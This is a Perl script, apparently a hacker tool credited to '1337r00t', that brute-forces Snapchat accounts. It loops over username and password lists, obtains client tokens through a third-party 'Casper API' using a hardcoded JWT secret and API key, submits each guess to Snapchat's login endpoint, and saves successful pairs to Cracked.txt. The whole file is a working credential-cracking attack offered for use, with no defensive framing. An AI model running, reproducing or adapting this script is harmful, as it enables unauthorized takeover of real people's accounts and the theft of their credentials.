##########################################
use LWP::UserAgent; # ppm install LWP::UserAgent
use JSON::WebToken; # ppm install JSON::WebToken
##########################################
system('clear');
system('cls');
system('color 5');
print qq(
################################
#   [Casper API] BF SC API     #
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;
print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('clear');
system('cls');
print '
    _   _____  _____   _____    ____    ___       ___     _____   
   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
 u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
 _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
';
print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		$jwt = JSON::WebToken->encode({
			sub => 'Joe',
			username => $username,
			password => $password,
			iat => time,
		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
		$casper = LWP::UserAgent->new();
		$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
		$casper->default_header('Content-Type' => "application/x-www-form-urlencoded; charset=UTF-8");
		$casper->default_header('User-Agent' => "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
		$casper->default_header('Connection' => "Keep-Alive");
		$requests = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
		if ($requests->content=~ /"code":200/) {
			$snapchat = LWP::UserAgent->new();
			$snapchat->default_header('X-Snapchat-Client-Token' => $requests->content=~ /"X-Snapchat-Client-Token":"(.+?)"/ );
			$snapchat->default_header('User-Agent' => $requests->content=~ /"User-Agent":"(.+?)"/ );
			$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $requests->content=~ /"X-Snapchat-Client-Auth-Token":"(.+?)"/ );
			$snapchat->default_header('Accept-Language' => "en-NZ;q=1");
			$response = $snapchat->post('https://auth.snapchat.com/scauth/login',
				{ 
				password => $password,
				timestamp => $requests->content=~ /"timestamp":"(.*?)"/,
				username => $username,
				req_token => $requests->content=~ /"req_token":"(.*?)"/
				}
				);
			if ($response->content=~ /"logged":true,/) {
				print "Cracked -> ($username:$password)\n";
				open(R0T,">>Cracked.txt");
				print R0T "\n($username:$password)\n";
				close(R0T);
				sleep(3);
			}
			else
			{
				if ($response->content=~ /not the right password/) {
					print "Failed -> ($username:$password)\n";
				}
				else
				{
					if ($response->content=~ /find an account with that username./) {
						print "Username Not Found -> ($username)\n";
					}
					else
					{
						print "Sorry, Blocked IP for many Requests\n";
					}
				}
			}
		}
		else {
			print "JWT [Casper API] Error";
		}
	}
}
